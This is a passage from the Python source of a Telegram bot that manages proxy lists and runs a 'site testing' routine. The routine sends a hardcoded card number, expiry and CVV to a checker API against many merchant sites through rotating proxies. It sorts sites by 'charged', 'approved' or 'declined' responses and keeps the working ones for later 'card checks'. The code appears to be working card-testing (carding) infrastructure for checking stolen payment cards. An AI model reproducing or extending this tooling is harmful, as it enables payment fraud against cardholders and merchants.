            await status_msg.edit(premium_emoji(f"❌ <b>Proxy is DEAD!</b>\n\n<code>{proxy}</code>"), parse_mode='html')
    except Exception as e:
        await status_msg.edit(premium_emoji(f"❌ Error checking proxy: {e}"), parse_mode='html')

@bot.on(events.NewMessage(pattern=r'^/rmproxy\s+'))
async def remove_single_proxy(event):
    user_id = event.sender_id
    if is_banned(user_id):
        return await event.reply(premium_emoji("🚫 You are banned!"), parse_mode='html')
    if not is_admin(user_id):
        return await event.reply(premium_emoji("❌ <b>Admin only command!</b>"), parse_mode='html')

    proxy_to_remove = event.message.text.split(' ', 1)[1].strip()
    if not proxy_to_remove:
        return await event.reply(premium_emoji("❌ Usage: <code>/rmproxy ip:port:user:pass</code>"), parse_mode='html')

    current_proxies = load_proxies()
    if proxy_to_remove not in current_proxies:
        return await event.reply(premium_emoji(f"❌ Proxy not found: <code>{proxy_to_remove}</code>"), parse_mode='html')

    new_proxies = [p for p in current_proxies if p != proxy_to_remove]

    async with aiofiles.open(PROXY_FILE, 'w') as f:
        for proxy in new_proxies:
            await f.write(f"{proxy}\n")

    await event.reply(premium_emoji(f"✅ <b>Proxy Removed!</b>\n\n<code>{proxy_to_remove}</code>"), parse_mode='html')

@bot.on(events.NewMessage(pattern=r'^/rmproxyindex\s+'))
async def remove_proxy_by_index(event):
    user_id = event.sender_id
    if is_banned(user_id):
        return await event.reply(premium_emoji("🚫 You are banned!"), parse_mode='html')
    if not is_admin(user_id):
        return await event.reply(premium_emoji("❌ <b>Admin only command!</b>"), parse_mode='html')

    indices_str = event.message.text.split(' ', 1)[1].strip()
    if not indices_str:
        return await event.reply(premium_emoji("❌ Usage: <code>/rmproxyindex 1,2,3</code>"), parse_mode='html')

    try:
        indices = [int(i.strip()) - 1 for i in indices_str.split(',')]
    except ValueError:
        return await event.reply(premium_emoji("❌ Invalid indices. Use numbers separated by commas."), parse_mode='html')

    current_proxies = load_proxies()
    if not current_proxies:
        return await event.reply(premium_emoji("❌ No proxies in proxy.txt"), parse_mode='html')

    removed = []
    new_proxies = []
    for i, proxy in enumerate(current_proxies):
        if i in indices:
            removed.append(proxy)
        else:
            new_proxies.append(proxy)

    if not removed:
        return await event.reply(premium_emoji("❌ No valid indices found."), parse_mode='html')

    async with aiofiles.open(PROXY_FILE, 'w') as f:
        for proxy in new_proxies:
            await f.write(f"{proxy}\n")

    await event.reply(
        premium_emoji(f"✅ <b>Removed {len(removed)} proxies!</b>\n\nRemoved:\n<code>" +
                      "\n".join(removed[:10]) + ("..." if len(removed) > 10 else "") + "</code>"),
        parse_mode='html'
    )

@bot.on(events.NewMessage(pattern=r'^/clearproxy$'))
async def clear_all_proxies(event):
    user_id = event.sender_id
    if is_banned(user_id):
        return await event.reply(premium_emoji("🚫 You are banned!"), parse_mode='html')
    if not is_admin(user_id):
        return await event.reply(premium_emoji("❌ <b>Admin only command!</b>"), parse_mode='html')

    current_proxies = load_proxies()
    count = len(current_proxies)

    if count == 0:
        return await event.reply(premium_emoji("❌ <code>proxy.txt</code> is already empty."), parse_mode='html')

    timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
    backup_filename = f"proxy_backup_{user_id}_{timestamp}.txt"

    try:
        async with aiofiles.open(backup_filename, 'w') as f:
            for proxy in current_proxies:
                await f.write(f"{proxy}\n")

        await event.reply(premium_emoji(f"📦 <b>Backup Created!</b>\n\nSending backup of {count} proxies before clearing..."), file=backup_filename, parse_mode='html')

        try:
            os.remove(backup_filename)
        except Exception:
            pass
    except Exception as e:
        return await event.reply(premium_emoji(f"❌ Error creating backup: {e}"), parse_mode='html')

    async with aiofiles.open(PROXY_FILE, 'w') as f:
        await f.write("")

    await event.reply(premium_emoji(f"✅ <b>Cleared all {count} proxies!</b>\n\n<code>proxy.txt</code> is now empty."), parse_mode='html')

@bot.on(events.NewMessage(pattern=r'^/getproxy$'))
async def get_all_proxies(event):
    user_id = event.sender_id
    if is_banned(user_id):
        return await event.reply(premium_emoji("🚫 You are banned!"), parse_mode='html')
    if not is_admin(user_id):
        return await event.reply(premium_emoji("❌ <b>Admin only command!</b>"), parse_mode='html')

    current_proxies = load_proxies()
    if not current_proxies:
        return await event.reply(premium_emoji("❌ No proxies in <code>proxy.txt</code>"), parse_mode='html')

    if len(current_proxies) <= 50:
        proxy_list = "\n".join([f"{i+1}. <code>{p}</code>" for i, p in enumerate(current_proxies)])
        await event.reply(premium_emoji(f"<b>📋 All Proxies ({len(current_proxies)}):</b>\n\n{proxy_list}"), parse_mode='html')
    else:
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        filename = f"proxies_{user_id}_{timestamp}.txt"

        async with aiofiles.open(filename, 'w') as f:
            for i, proxy in enumerate(current_proxies):
                await f.write(f"{i+1}. {proxy}\n")

        await event.reply(premium_emoji(f"<b>📋 All Proxies ({len(current_proxies)}):</b>\n\nFile attached below."), file=filename, parse_mode='html')

        try:
            os.remove(filename)
        except Exception:
            pass

# ========== LIVE SITE TESTING WITH PROGRESS BAR ==========
# Persistence file for site test results
SITE_TEST_RESULTS_FILE = 'site_test_results.json'

def load_site_test_results():
    """Load persisted site test results."""
    if not os.path.exists(SITE_TEST_RESULTS_FILE):
        return {}
    try:
        with open(SITE_TEST_RESULTS_FILE, 'r') as f:
            return json.load(f)
    except Exception:
        return {}

def save_site_test_results(results):
    """Save site test results to disk."""
    try:
        with open(SITE_TEST_RESULTS_FILE, 'w') as f:
            json.dump(results, f, indent=2)
    except Exception as e:
        print(f"Error saving site test results: {e}")

async def live_site_test_progress(chat_id, sites, proxies):
    """
    Test all sites with live progress bar updates in Telegram.
    Returns: dict with 'working', 'dead', 'error' site lists
    """
    if not sites:
        await bot.send_message(chat_id, premium_emoji("❌ No sites to test!"), parse_mode='html')
        return {'working': [], 'dead': [], 'error': []}

    if not proxies:
        await bot.send_message(chat_id, premium_emoji("❌ No proxies available for testing!"), parse_mode='html')
        return {'working': [], 'dead': [], 'error': []}

    total = len(sites)
    completed = 0
    start_time = time.time()

    results = {
        'working': [],
        'dead': [],
        'error': []
    }

    recent_results = []  # Keep last 10 for display

    # Initial message
    bar_blocks = 20
    filled = 0
    empty = bar_blocks
    bar = "█" * filled + "░" * empty
    percentage = 0

    initial_msg = f"""🔍 <b>Site Testing Progress</b>

[{bar}] {percentage}%
{completed}/{total} sites tested

<b>Current:</b> Starting...

<b>Recent Results:</b>
<i>No results yet...</i>

⏱️ <b>Elapsed:</b> 0s"""

    progress_msg = await bot.send_message(chat_id, premium_emoji(initial_msg), parse_mode='html')

    # Test sites with concurrency limit
    sem = asyncio.Semaphore(10)  # 10 concurrent tests
    last_edit_time = 0
    edit_cooldown = 2.0  # Telegram rate limit: edit every 2 seconds minimum

    async def test_single_site(site):
        nonlocal completed, last_edit_time
        async with sem:
            proxy = random.choice(proxies)
            test_card = "5154623245618097|03|2032|156"

            site_start = time.time()
            status = "⚠️"
            status_text = "error"

            try:
                params = {'cc': test_card, 'site': site, 'proxy': proxy}
                raw = await asyncio.wait_for(call_checker_api(params), timeout=30)

                response_msg = str(raw.get('Response', '')).lower()
                api_status = raw.get('Status', False)
                price = raw.get('Price', 0)

                # Classify result
                try:
                    price_float = float(price) if price != '-' else 0.0
                except (ValueError, TypeError):
                    price_float = 0.0

                # Dead indicators or zero price
                if is_dead_site_error(response_msg) or price_float == 0.0:
                    status = "❌"
                    status_text = "dead"
                    results['dead'].append(site)
                # Valid response (Approved, Charged, or Declined)
                elif api_status or any(x in response_msg for x in ['charged', 'approved', 'declined', 'insufficient']):
                    status = "✅"
                    status_text = "working"
                    results['working'].append(site)
                else:
                    status = "⚠️"
                    status_text = "error"
                    results['error'].append(site)

            except asyncio.TimeoutError:
                status = "❌"
                status_text = "timeout"
                results['dead'].append(site)
            except Exception as e:
                error_lower = str(e).lower()
                if is_dead_site_error(error_lower):
                    status = "❌"
                    status_text = "dead"
                    results['dead'].append(site)
                else:
                    status = "⚠️"
                    status_text = "error"
                    results['error'].append(site)

            elapsed_site = time.time() - site_start
            completed += 1

            # Add to recent results (keep last 10)
            recent_results.append(f"{status} {site} ({elapsed_site:.1f}s)")
            if len(recent_results) > 10:
                recent_results.pop(0)

            # Update progress bar (with rate limiting)
            now = time.time()
            if now - last_edit_time >= edit_cooldown or completed == total:
                last_edit_time = now

                percentage = int((completed / total) * 100)
                filled = int((completed / total) * bar_blocks)
                empty = bar_blocks - filled
                bar = "█" * filled + "░" * empty

                elapsed_total = int(now - start_time)
                mins = elapsed_total // 60
                secs = elapsed_total % 60

                recent_display = "\n".join(recent_results[-10:]) if recent_results else "<i>No results yet...</i>"

                progress_text = f"""🔍 <b>Site Testing Progress</b>

[{bar}] {percentage}%
{completed}/{total} sites tested

<b>Current:</b> {site if completed < total else "Complete!"}

<b>Recent Results:</b>
{recent_display}

⏱️ <b>Elapsed:</b> {mins}m {secs}s
✅ Working: {len(results['working'])} | ❌ Dead: {len(results['dead'])} | ⚠️ Error: {len(results['error'])}"""

                try:
                    await progress_msg.edit(premium_emoji(progress_text), parse_mode='html')
                except Exception:
                    pass  # Rate limit hit, skip this update

    # Run all tests
    tasks = [test_single_site(site) for site in sites]
    await asyncio.gather(*tasks, return_exceptions=True)

    # Final summary with inline keyboard
    elapsed_total = int(time.time() - start_time)
    mins = elapsed_total // 60
    secs = elapsed_total % 60

    summary = f"""✅ <b>Site Testing Complete!</b>

<b>Summary:</b>
✅ <b>Working:</b> {len(results['working'])}
❌ <b>Dead:</b> {len(results['dead'])}
⚠️ <b>Error:</b> {len(results['error'])}

<b>Total:</b> {total} sites tested
⏱️ <b>Time:</b> {mins}m {secs}s

<i>Working sites have been cached for use in card checks.</i>"""

    # Add retest button if there are dead sites
    buttons = None
    if results['dead']:
        buttons = [[Button.inline("🔄 Retest Dead Sites", b"retest_dead")]]

    try:
        await progress_msg.edit(premium_emoji(summary), parse_mode='html', buttons=buttons)
    except Exception:
        pass

    # Update healthy endpoints list with working sites
    global _healthy_endpoints
    async with _endpoint_lock:
        # Save current working sites for site testing (not API endpoints)
        persisted = {
            'timestamp': time.time(),
            'working': results['working'],
            'dead': results['dead'],
            'error': results['error']
        }
        save_site_test_results(persisted)

    # AUTO-UPDATE sites.txt: Remove dead sites, keep working + error sites
    # Error sites get another chance; dead sites are removed
    if results['dead']:
        try:
            kept_sites = results['working'] + results['error']
            if kept_sites:
                with open(SITES_FILE, 'w', encoding='utf-8') as f:
                    for site in kept_sites:
                        f.write(f"{site}\n")

                await bot.send_message(
                    chat_id,
                    premium_emoji(
                        f"📝 <b>sites.txt updated!</b>\n\n"
                        f"✅ Kept: {len(kept_sites)} sites (working + error)\n"
                        f"🗑️ Removed: {len(results['dead'])} dead sites"
                    ),
                    parse_mode='html'
                )
        except Exception as e:
            print(f"Error updating sites.txt: {e}")

    return results

@bot.on(events.NewMessage(pattern='/testsites'))
async def test_sites_command(event):
    """Admin command to manually trigger site testing with live progress."""
    user_id = event.sender_id
    if not is_admin(user_id):
        return await event.reply(premium_emoji("❌ <b>Admin only command!</b>"), parse_mode='html')

    sites = load_sites()
    proxies = load_proxies()

    if not sites:
        return await event.reply(premium_emoji("❌ No sites loaded in sites.txt!"), parse_mode='html')

    if not proxies:
        return await event.reply(premium_emoji("❌ No proxies loaded in proxy.txt!"), parse_mode='html')

    await event.reply(premium_emoji(f"🚀 <b>Starting site test...</b>\n\nTesting {len(sites)} sites with {len(proxies)} proxies."), parse_mode='html')

    # Run the live progress test
    await live_site_test_progress(event.chat_id, sites, proxies)

@bot.on(events.CallbackQuery(pattern=b"retest_dead"))
async def retest_dead_sites(event):
    """Retest only sites that failed in the previous test."""
    user_id = event.sender_id
    if not is_admin(user_id):
        return await event.answer("❌ Admin only!", alert=True)

    # Load previous results
    prev_results = load_site_test_results()
    dead_sites = prev_results.get('dead', [])

    if not dead_sites:
        return await event.answer("No dead sites to retest!", alert=False)

    proxies = load_proxies()
    if not proxies:
        return await event.answer("❌ No proxies available!", alert=True)

    await event.answer("🔄 Retesting dead sites...", alert=False)

    # Run test on dead sites only
    await live_site_test_progress(event.chat_id, dead_sites, proxies)

# ========== CALLBACKS ==========

@bot.on(events.CallbackQuery(pattern=b"pause"))
async def pause_handler(event):
    user_id = event.sender_id
    message_id = event.message_id
    session_key = f"{user_id}_{message_id}"
    sess = active_sessions.get(session_key)
    if sess:
        sess['paused'] = True
        paused_ev = sess.get('paused_event')
        if paused_ev:
            paused_ev.set()
    await event.answer(premium_emoji("⏸️ Paused"))

@bot.on(events.CallbackQuery(pattern=b"resume"))
async def resume_handler(event):
    user_id = event.sender_id
    message_id = event.message_id
    session_key = f"{user_id}_{message_id}"
    sess = active_sessions.get(session_key)
    if sess:
        sess['paused'] = False
        paused_ev = sess.get('paused_event')
        if paused_ev:
            paused_ev.clear()
    await event.answer(premium_emoji("▶️ Resumed"))

@bot.on(events.CallbackQuery(pattern=b"stop"))
async def stop_handler(event):
    user_id = event.sender_id
    message_id = event.message_id
    session_key = f"{user_id}_{message_id}"
    sess = active_sessions.pop(session_key, None)
    if sess:
        stop_ev = sess.get('stop_event')
        if stop_ev:
            stop_ev.set()
    await event.answer(premium_emoji("🛑 Stopped"))
    await event.edit(premium_emoji("😡 <b>Checking stopped by user.</b>"), parse_mode='html')

# ========== STARTUP ==========
async def main():
    await init_db()
    asyncio.create_task(health_check_loop())
    await resolve_chat_ids()
    print("✅ Bot started successfully!")
    await bot.run_until_disconnected()

if __name__ == "__main__":
    with bot:
        bot.loop.run_until_complete(main())
